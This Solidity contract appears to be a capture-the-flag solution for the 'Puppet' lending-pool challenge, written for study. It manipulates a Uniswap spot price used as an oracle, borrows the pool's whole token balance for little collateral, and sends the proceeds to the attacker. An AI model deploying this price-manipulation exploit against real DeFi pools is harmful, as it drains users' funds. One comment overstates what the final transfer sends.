// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Uniswap_ {
    function tokenToEthSwapInput(
        uint256 tokensSold,
        uint256 minEth,
        uint256 deadline
    ) external returns (uint256);

    function ethToTokenSwapInput(uint256 minTokens, uint256 deadline)
        external
        payable
        returns (uint256);
}

interface Token_ {
    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
}

interface PuppetPool_ {
    function borrow(uint256 amount, address recipient) external payable;

    function calculateDepositRequired(uint256 amount)
        external
        view
        returns (uint256);
}

contract PuppetAttacker {
    Uniswap_ uniswap;
    Token_ token;
    PuppetPool_ pool;
    address payable attacker;

    constructor(
        address _uniswap,
        address _token,
        address _pool
    ) payable {
        uniswap = Uniswap_(_uniswap);
        token = Token_(_token);
        pool = PuppetPool_(_pool);
        attacker = payable(msg.sender);
    }

    function attack() external {
        // Swap the attacker's entire 1000 DVT balance for ETH, creating a very imbalanced ratio in the exchange.
        // Attacker must transfer DVT tokens from their address to this contract before calling this function.
        uint256 initialAttackerBalance = token.balanceOf(address(this));
        token.approve(address(uniswap), initialAttackerBalance);
        uniswap.tokenToEthSwapInput(
            initialAttackerBalance,
            1,
            block.timestamp + 300
        );

        // Since .borrow uses the uniswap exchange as a price oracle, the required collateral is now extremely low
        // (about 20 ETH for the entire DVT balance). Attacker must send sufficient ETH when deploying this contract.
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.borrow{value: 20 ether}(poolBalance, attacker); // Any excess ETH sent will be refunded

        // Reverse the initial price manipulation swap to close any arbitrage opportunity.
        uniswap.ethToTokenSwapInput{value: 1 ether}(1, block.timestamp + 300); // Hardcoded 1 ETH as an example

        // Send all DVT and remaining ETH back to the attacker
        attacker.transfer(address(this).balance);
    }

    receive() external payable {}
}
